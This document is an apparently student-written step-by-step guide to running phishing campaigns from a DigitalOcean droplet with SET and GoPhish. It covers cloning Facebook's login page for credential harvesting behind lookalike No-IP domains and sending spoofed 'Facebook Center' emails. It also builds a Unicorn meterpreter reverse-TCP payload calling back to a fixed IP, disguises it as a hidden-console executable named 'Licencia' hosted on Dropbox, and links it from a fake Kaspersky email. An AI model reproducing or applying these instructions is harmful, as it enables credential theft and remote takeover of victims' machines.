## Summary:
This is a recreation to create a couple of pishing campaigns

## Description
With one droplet or machine that have public ip, we are going to perform a couple of pishing campaings with differents aplications that are SET and GoPhish

## Steps To Reproduce:
1. First we will need some things
	- A droplet or machine with public Ip in this case i use Digital Ocean
		- Create a droplet with ubuntu on DigitalOcean
		- Acces the machine via console or ssh
	- A email of gmail for send mails
	- An account in noip
	- An account in dropbox
	- NotePad or NotePad++ or something to change .txt to .bat
	- .Bat to .exe app
	- 2 mails template and one html template (Can be download down)
2. Install Katoolin3 for app of Kali
	1. Use the next commands:
		- "sudo add-apt-repository universe"
		- "git clone https://github.com/s-h-3-l-l/katoolin3"
		- "cd katoolin3/"
		- "chmod +x ./install.sh"
		- "sudo ./install.sh"
3. Install SET from katoolin3
	1. "sudo katoolin3"
	1. enter "0" for view categories tab
	2. enter "0" for exploitation tools tab
	3. enter "15" for install SET
4. Setup hostname for the 2 pages in Noip
	- Eg.
		- facebuok.ddns.net ip 157.230.93.90
		- preguntasfrecuentes.ddns.net ip 157.230.93.90
5. Change Apache ports.
	1. Edit /etc/apache2/ports.conf file.
		1. There edit line "Listen 80"
			- Eg "Listen 81"
	2. Edit port too in /etc/apache2/sites-enabled/000-default.conf 
		1. Edit the first line "<VirtualHost *:80>"
			- Eg. "<VirtualHost *:81>"
	3. And do "systemctl stop apache2" and "systemctl start apache2"
6. Configure gmail account for send mails with SET
	1. Go to gmail.com
	2. Go to Configuration of the account
	3. Go to security tab
	4. Change Less secure app access to on
7. Make a copy of Facebook with SET
	1. In a terminal :"setoolkit"
	2. enter "1" for social penetretion attacks
	3. enter "2" for website attack vector
	4. enter "3" for credential harvest attack method
	5. enter "2" for site cloner
	6. Enter the required data (Host ip and url of page) Eg.
		- 157.230.93.90
		- "https://www.facebook.com"
8. Send a mail with SET
	1. In a new terminal: "setoolkit"
	2. enter "1" for social penetretion attacks
	3. enter "5" for Mass Mailer Attack
	4. enter "1" for  E-Mail Attack Single Email Address 
	5. Enter the email that wants to attack
		- Eg. "iteso.esi.1@gmail.com"
	6. Enter "1" for Use a gmail Account for your email attack.
	7. Enter the required data Eg.
		- facebouk163@gmail.com
		- Facebook Center
		- ******
		- yes
		- n
		- n
		- Inicio de Sesion no verificado
		- h
		- -Copy of the html inicio de sesion facebook that download before-
		- END
10. In the terminal that copy facebook wait until the user try to login in the fake page
	1. For see report go to
		1. /root/.set/reports/
9. Create a new page in apache for the mail campaign in GoPhish
	1. Remove original index
		- "rm /var/www/html/index.html"
	2. Create a new index
		- "nano /var/www/html/index.html"
	3. There copy all the content of Html Preguntas Iteso or make your own html code.
10. Install Unicorn and create payload
	1. "git clone https://github.com/trustedsec/unicorn.git"
	2. "cd unicorn/"
	3. For make the payload
		- "./unicorn.py windows/meterpreter/reverse_tcp [IP] [Port]"
			- Eg "./unicorn.py windows/meterpreter/reverse_tcp 157.230.93.90 448"
	4. For tell metasploit to listen in that ip in that port with this payload
		- "cd unicorn/"
		- "msfconsole -r unicorn.rc"
	5.   Download powershell_attack.txt to another machine with an app for convert .bat to .exe with scp
		- scp user@IP:unicorn/powershell_attack.txt machine_directory
			- Eg. scp root@157.230.93.90:unicorn/powershell_attack.txt C:/Users/luisd/Documents/
	6. Open Notepad and open powershell_attack.txt and save as powershell_attack.bat
	7. Open bat to exe converter
		1. Open powershell_attack.bat.
			1. Remove the lines with #
			2. Add at the top "notepad"
			3. In options change Exe-format to 64 Bit | Console Invisible and fill icon.
			4. Click in convert button and save it as Licencia or anothe name that you want.
	8. Upload the file to Dropbox and make a share link
	9. In the share link change the end "dl=0" to "dl=1"
	10. Open the "Mail kaspersky"
		1. And change  href with your link 
			1. Eg. a href="https://www.dropbox.com/s/a6xl1zi1rz95sn1/Licencia.exe?dl=1"
11. Install Gophish
	1. "sudo apt install unzip"
	2. "wget https://github.com/gophish/gophish/releases/download/v0.5.0/gophish-v0.5.0-linux-64bit.zip"
	3. "sudo mkdir /opt/gophish"
	4. "sudo unzip gophish-v0.5.0-linux-64bit.zip -d /opt/gophish"
	5. "sudo sed -i 's!127.0.0.1!0.0.0.0!g' /opt/gophish/config.json"
	7. Change port
		1. Go to nano /opt/gophish/config.json
		2. change "listen url:"0.0.0.0:80" to "0.0.0.0:433"
	6. Init gophish
		1. "cd /opt/gophish"
		2. "sudo ./gophish"
12. Make the campaing
	1. Go to https://IP:3333
		- Eg. https://157.230.93.90:3333/
	2. Enter with user:admin password:gophish
	3. Go to Email Templates
		1. Add a new template
			1. Put the name and the subjet and go to html tab
			2. Copy the content of Mail Kapersky or make your own mail
	4. Go to Landing Pages tab
		2. Add Landing Page
			1. Name it and copy the content of HTML Preguntas Iteso or make your own page
	5. Go to Sending Profiles tab
		3. Add a Sending Profile
			1. Name it
			2. From put the name that user will see at first
			3. Host: smtp.gmail.com:587
			4. Username : Your gmail
			5. Password: Your gmail password
	6. Go to Usuers & Groups tab
		4. Add  a new group
			1. There add the mails that you want to phishing.
	7. Go to Campaigns tab
		1. Add a new Campaign
		2. Name it, select all the things that just created and in  Url: put the Ip of the Droplet
		3. Start the campaign.
## Supporting Material/References:
[Templates](https://iteso01-my.sharepoint.com/:f:/g/personal/si721750_iteso_mx/EpfU-WrwW9pGiyqlCAERJ9UBISuyUkeYM9ujMGjwIYhsMw?e=03Ff9F)

[SET](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/)

[GoPhish](https://getgophish.com/)

[NotePad++](https://notepad-plus-plus.org/downloads/)

[BatToExe](https://www.majorgeeks.com/files/details/bat_to_exe_converter.html)

[NoIp](https://www.noip.com/)

[Katoolin3](https://github.com/s-h-3-l-l/katoolin3)

[Gmail](Gmail.com)

